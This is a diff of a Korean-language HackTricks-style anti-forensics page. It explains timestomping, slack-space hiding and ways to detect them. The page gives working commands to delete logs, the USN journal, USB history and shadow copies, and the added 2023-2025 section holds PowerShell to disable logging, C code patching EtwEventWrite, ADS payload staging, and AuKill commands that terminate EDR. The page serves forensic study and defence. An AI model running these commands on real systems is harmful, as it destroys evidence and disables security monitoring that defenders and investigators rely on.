@@ -5,7 +5,7 @@
 ## 타임스탬프
 
 공격자는 **파일의 타임스탬프를 변경**하여 탐지를 피하고자 할 수 있습니다.\
-타임스탬프는 MFT의 `$STANDARD_INFORMATION` \_\_ 및 \_\_ `$FILE_NAME` 속성 안에서 찾을 수 있습니다.
+타임스탬프는 MFT의 속성 `$STANDARD_INFORMATION` \_\_ 및 \_\_ `$FILE_NAME` 내에서 찾을 수 있습니다.
 
 두 속성 모두 4개의 타임스탬프를 가지고 있습니다: **수정**, **접근**, **생성**, 및 **MFT 레지스트리 수정** (MACE 또는 MACB).
 
@@ -13,7 +13,7 @@
 
 ### TimeStomp - 안티 포렌식 도구
 
-이 도구는 **`$STANDARD_INFORMATION`** 내부의 타임스탬프 정보를 **수정**하지만 **`$FILE_NAME`** 내부의 정보는 **수정하지 않습니다**. 따라서 **의심스러운** **활동**을 **식별**할 수 있습니다.
+이 도구는 **`$STANDARD_INFORMATION`** 내의 타임스탬프 정보를 **수정**하지만 **`$FILE_NAME`** 내의 정보는 **수정하지 않습니다**. 따라서 **의심스러운** **활동**을 **식별**할 수 있습니다.
 
 ### Usnjrnl
 
@@ -21,15 +21,15 @@
 
 ![](<../../images/image (801).png>)
 
-이전 이미지는 **도구**에서 표시된 **출력**으로, 파일에 대해 **일부 변경이 수행되었음을** 관찰할 수 있습니다.
+이전 이미지는 **도구**에서 표시된 **출력**으로, 파일에 **변경이 수행되었음을** 관찰할 수 있습니다.
 
 ### $LogFile
 
-**파일 시스템에 대한 모든 메타데이터 변경 사항은** [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging)이라는 프로세스에 기록됩니다. 기록된 메타데이터는 NTFS 파일 시스템의 루트 디렉토리에 위치한 `**$LogFile**`이라는 파일에 저장됩니다. [LogFileParser](https://github.com/jschicht/LogFileParser)와 같은 도구를 사용하여 이 파일을 구문 분석하고 변경 사항을 식별할 수 있습니다.
+**파일 시스템에 대한 모든 메타데이터 변경 사항은** [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging)이라는 프로세스에 기록됩니다. 기록된 메타데이터는 NTFS 파일 시스템의 루트 디렉토리에 위치한 `**$LogFile**`이라는 파일에 저장됩니다. [LogFileParser](https://github.com/jschicht/LogFileParser)와 같은 도구를 사용하여 이 파일을 파싱하고 변경 사항을 식별할 수 있습니다.
 
 ![](<../../images/image (137).png>)
 
-다시 말해, 도구의 출력에서 **일부 변경이 수행되었음을** 볼 수 있습니다.
+다시 말해, 도구의 출력에서 **일부 변경이 수행되었음을** 확인할 수 있습니다.
 
 같은 도구를 사용하여 **타임스탬프가 수정된 시간을 식별**할 수 있습니다:
 
@@ -46,7 +46,7 @@
 
 ### 나노초
 
-**NTFS** 타임스탬프는 **100 나노초**의 **정밀도**를 가집니다. 따라서 타임스탬프가 2010-10-10 10:10:**00.000:0000인 파일을 찾는 것은 매우 의심스럽습니다.
+**NTFS** 타임스탬프는 **100 나노초**의 **정밀도**를 가집니다. 따라서 2010-10-10 10:10:**00.000:0000와 같은 타임스탬프를 가진 파일을 찾는 것은 매우 의심스럽습니다.
 
 ### SetMace - 안티 포렌식 도구
 
@@ -54,7 +54,7 @@
 
 ## 데이터 숨기기
 
-NFTS는 클러스터와 최소 정보 크기를 사용합니다. 즉, 파일이 클러스터와 반 개를 차지하면, **남은 반 개는 파일이 삭제될 때까지 절대 사용되지 않습니다**. 따라서 이 슬랙 공간에 **데이터를 숨길 수 있습니다**.
+NFTS는 클러스터와 최소 정보 크기를 사용합니다. 즉, 파일이 클러스터와 반 개를 차지하면 **남은 반은 파일이 삭제될 때까지 절대 사용되지 않습니다**. 따라서 이 슬랙 공간에 **데이터를 숨길 수 있습니다**.
 
 슬래커와 같은 도구를 사용하면 이 "숨겨진" 공간에 데이터를 숨길 수 있습니다. 그러나 `$logfile` 및 `$usnjrnl` 분석을 통해 일부 데이터가 추가되었음을 보여줄 수 있습니다:
 
@@ -64,7 +64,7 @@ NFTS는 클러스터와 최소 정보 크기를 사용합니다. 즉, 파일이 
 
 ## UsbKill
 
-이 도구는 **USB** 포트에서 변경 사항이 감지되면 **컴퓨터를 끕니다**.\
+이 도구는 **USB** 포트에서 변경 사항이 감지되면 컴퓨터를 **꺼**버립니다.\
 이를 발견하는 방법은 실행 중인 프로세스를 검사하고 **실행 중인 각 파이썬 스크립트를 검토**하는 것입니다.
 
 ## 라이브 리눅스 배포판
@@ -83,24 +83,24 @@ NFTS는 클러스터와 최소 정보 크기를 사용합니다. 즉, 파일이 
 
 이것은 사용자가 각 실행 파일을 실행한 날짜와 시간을 유지하는 레지스트리 키입니다.
 
-UserAssist를 비활성화하려면 두 단계가 필요합니다:
+UserAssist를 비활성화하려면 두 단계를 수행해야 합니다:
 
 1. 두 개의 레지스트리 키, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` 및 `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`를 모두 0으로 설정하여 UserAssist를 비활성화하겠다는 신호를 보냅니다.
 2. `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`와 같은 레지스트리 하위 트리를 지웁니다.
 
 ### 타임스탬프 비활성화 - Prefetch
 
-이것은 Windows 시스템의 성능을 향상시키기 위해 실행된 응용 프로그램에 대한 정보를 저장합니다. 그러나 이것은 포렌식 관행에도 유용할 수 있습니다.
+이것은 Windows 시스템의 성능을 향상시키기 위해 실행된 애플리케이션에 대한 정보를 저장합니다. 그러나 이것은 포렌식 관행에도 유용할 수 있습니다.
 
 - `regedit` 실행
 - 파일 경로 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters` 선택
 - `EnablePrefetcher` 및 `EnableSuperfetch`를 마우스 오른쪽 버튼으로 클릭
-- 각 항목에서 값을 1(또는 3)에서 0으로 변경하기 위해 수정 선택
+- 각 값을 1(또는 3)에서 0으로 변경하기 위해 수정 선택
 - 재부팅
 
 ### 타임스탬프 비활성화 - 마지막 접근 시간
 
-Windows NT 서버의 NTFS 볼륨에서 폴더가 열릴 때마다 시스템은 각 나열된 폴더에 대해 **타임스탬프 필드를 업데이트하는 데 시간을 소요합니다**, 이를 마지막 접근 시간이라고 합니다. 사용량이 많은 NTFS 볼륨에서는 성능에 영향을 줄 수 있습니다.
+NTFS 볼륨에서 폴더가 열릴 때마다 시스템은 각 나열된 폴더에 대해 **타임스탬프 필드를 업데이트하는 데 시간을 소요합니다**, 이를 마지막 접근 시간이라고 합니다. 사용량이 많은 NTFS 볼륨에서는 성능에 영향을 줄 수 있습니다.
 
 1. 레지스트리 편집기(Regedit.exe)를 엽니다.
 2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`으로 이동합니다.
@@ -109,10 +109,10 @@ Windows NT 서버의 NTFS 볼륨에서 폴더가 열릴 때마다 시스템은 �
 
 ### USB 기록 삭제
 
-모든 **USB 장치 항목**은 USB 장치를 PC 또는 노트북에 연결할 때 생성되는 하위 키를 포함하는 **USBSTOR** 레지스트리 키 아래에 저장됩니다. 이 키는 여기에서 찾을 수 있습니다: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **이것을 삭제하면** USB 기록이 삭제됩니다.\
+모든 **USB 장치 항목**은 USB 장치를 PC 또는 노트북에 연결할 때 생성되는 하위 키를 포함하는 **USBSTOR** 레지스트리 키 아래에 Windows 레지스트리에 저장됩니다. 이 키는 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`에서 찾을 수 있습니다. **이것을 삭제하면** USB 기록이 삭제됩니다.\
 또한 [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) 도구를 사용하여 삭제되었는지 확인할 수 있습니다 (그리고 삭제할 수 있습니다).
 
-USB에 대한 정보를 저장하는 또 다른 파일은 `C:\Windows\INF` 내부의 `setupapi.dev.log` 파일입니다. 이것도 삭제해야 합니다.
+USB에 대한 정보를 저장하는 또 다른 파일은 `C:\Windows\INF` 내의 `setupapi.dev.log` 파일입니다. 이것도 삭제해야 합니다.
 
 ### 섀도우 복사 비활성화
 
@@ -125,13 +125,13 @@ GUI를 통해 삭제하려면 [https://www.ubackup.com/windows-10/how-to-delete-
 
 1. Windows 시작 버튼을 클릭한 후 텍스트 검색 상자에 "services"를 입력하여 서비스 프로그램을 엽니다.
 2. 목록에서 "Volume Shadow Copy"를 찾아 선택한 후 마우스 오른쪽 버튼을 클릭하여 속성에 접근합니다.
-3. "시작 유형" 드롭다운 메뉴에서 비활성화를 선택하고 변경 사항을 적용하고 확인을 클릭합니다.
+3. "시작 유형" 드롭다운 메뉴에서 비활성화를 선택하고 변경 사항을 적용하고 확인합니다.
 
 어떤 파일이 섀도우 복사에 복사될지를 레지스트리 `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`에서 수정할 수도 있습니다.
 
 ### 삭제된 파일 덮어쓰기
 
-- **Windows 도구**를 사용할 수 있습니다: `cipher /w:C` 이는 C 드라이브의 사용 가능한 미사용 디스크 공간에서 데이터를 제거하도록 지시합니다.
+- **Windows 도구**를 사용할 수 있습니다: `cipher /w:C` 이는 C 드라이브 내의 사용 가능한 미사용 디스크 공간에서 데이터를 제거하도록 지시합니다.
 - [**Eraser**](https://eraser.heidi.ie)와 같은 도구를 사용할 수도 있습니다.
 
 ### Windows 이벤트 로그 삭제
@@ -142,12 +142,74 @@ GUI를 통해 삭제하려면 [https://www.ubackup.com/windows-10/how-to-delete-
 
 ### Windows 이벤트 로그 비활성화
 
-- `reg add 'HKLM\SYSTEM\CurrentControlSet\Services\eventlog' /v Start /t REG_DWORD /d 4 /f`
-- 서비스 섹션에서 "Windows 이벤트 로그" 서비스를 비활성화합니다.
+- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
+- 서비스 섹션 내에서 "Windows 이벤트 로그" 서비스를 비활성화합니다.
 - `WEvtUtil.exec clear-log` 또는 `WEvtUtil.exe cl`
 
 ### $UsnJrnl 비활성화
 
 - `fsutil usn deletejournal /d c:`
+
+---
+
+## 고급 로깅 및 추적 변조 (2023-2025)
+
+### PowerShell ScriptBlock/Module 로깅
+
+최근 버전의 Windows 10/11 및 Windows Server는 `Microsoft-Windows-PowerShell/Operational` (이벤트 4104/4105/4106) 아래에 **풍부한 PowerShell 포렌식 아티팩트**를 유지합니다. 공격자는 이를 실시간으로 비활성화하거나 삭제할 수 있습니다:
+```powershell
+# Turn OFF ScriptBlock & Module logging (registry persistence)
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
+-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
+-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force
+
+# In-memory wipe of recent PowerShell logs
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
+Remove-WinEvent               # requires admin & Win11 23H2+
+```
+수비자는 해당 레지스트리 키의 변경 사항과 PowerShell 이벤트의 대량 제거를 모니터링해야 합니다.
+
+### ETW (Windows 이벤트 추적) 패치
+
+엔드포인트 보안 제품은 ETW에 크게 의존합니다. 2024년의 인기 있는 회피 방법은 메모리에서 `ntdll!EtwEventWrite`/`EtwEventWriteFull`을 패치하여 모든 ETW 호출이 이벤트를 발생시키지 않고 `STATUS_SUCCESS`를 반환하도록 하는 것입니다.
+```c
+// 0xC3 = RET on x64
+unsigned char patch[1] = { 0xC3 };
+WriteProcessMemory(GetCurrentProcess(),
+GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
+patch, sizeof(patch), NULL);
+```
+Public PoCs (e.g. `EtwTiSwallow`)는 PowerShell 또는 C++에서 동일한 프리미티브를 구현합니다. 패치가 **프로세스-로컬**이기 때문에 다른 프로세스에서 실행되는 EDR은 이를 놓칠 수 있습니다. 탐지: 메모리의 `ntdll`과 디스크의 `ntdll`을 비교하거나 사용자 모드 이전에 후킹합니다.
+
+### 대체 데이터 스트림 (ADS) 부활
+
+2023년의 악성코드 캠페인 (예: **FIN12** 로더)은 전통적인 스캐너의 시야에서 벗어나기 위해 ADS 내부에 2단계 바이너리를 스테이징하는 것이 관찰되었습니다:
+```cmd
+rem Hide cobalt.bin inside an ADS of a PDF
+type cobalt.bin > report.pdf:win32res.dll
+rem Execute directly
+wmic process call create "cmd /c report.pdf:win32res.dll"
+```
+스트림을 나열하려면 `dir /R`, `Get-Item -Stream *` 또는 Sysinternals `streams64.exe`를 사용하십시오. 호스트 파일을 FAT/exFAT로 복사하거나 SMB를 통해 복사하면 숨겨진 스트림이 제거되며, 이는 조사자가 페이로드를 복구하는 데 사용할 수 있습니다.
+
+### BYOVD & “AuKill” (2023)
+
+Bring-Your-Own-Vulnerable-Driver는 이제 랜섬웨어 침입에서 **안티 포렌식**을 위해 정기적으로 사용됩니다. 오픈 소스 도구 **AuKill**은 서명된 그러나 취약한 드라이버(`procexp152.sys`)를 로드하여 암호화 및 로그 파괴 **전**에 EDR 및 포렌식 센서를 일시 중지하거나 종료합니다:
+```cmd
+AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
+AuKill.exe -k CrowdStrike
+```
+드라이버는 이후 제거되어 최소한의 아티팩트를 남깁니다.  
+완화 조치: Microsoft 취약한 드라이버 차단 목록(HVCI/SAC)을 활성화하고, 사용자 쓰기 가능한 경로에서 커널 서비스 생성에 대해 경고합니다.
+
+---
+
+## References
+
+- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (March 2023)  
+https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
+- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (June 2024)  
+https://redcanary.com/blog/etw-patching-detection
 
 {{#include ../../banners/hacktricks-training.md}}
